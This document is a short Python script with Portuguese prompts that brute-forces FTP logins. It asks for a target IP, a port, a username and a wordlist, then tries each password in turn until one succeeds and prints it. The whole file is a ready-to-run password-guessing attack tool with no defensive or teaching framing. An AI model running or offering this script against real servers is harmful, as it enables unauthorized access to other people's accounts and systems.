#!/usr/bin/python3
import ftplib
from termcolor import colored

host = input(colored("INFORME O IP: ",'blue'))
p = input(colored("INFORME A PORTA: ",'yellow'))
user = input(colored("INFORME O USER: ",'blue'))
worlist = input(colored("INFORME A WORDLIST: ",'yellow'))
port = int(p)
def is_correct(password):
    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=5)
        server.login(user, password)

    except ftplib.error_perm:
        return False
    else:
        print ("[+]BRUTE FORCE FEITO COM SUCESSO ---> ""\033[34m" + password + "\033[0m")
        return True
passwords = open(worlist).read().split("\n")
print (colored("[+]INIANDO O BRUTE FORCE[+]",'red'))

for password in passwords:
    if is_correct(password):
        break
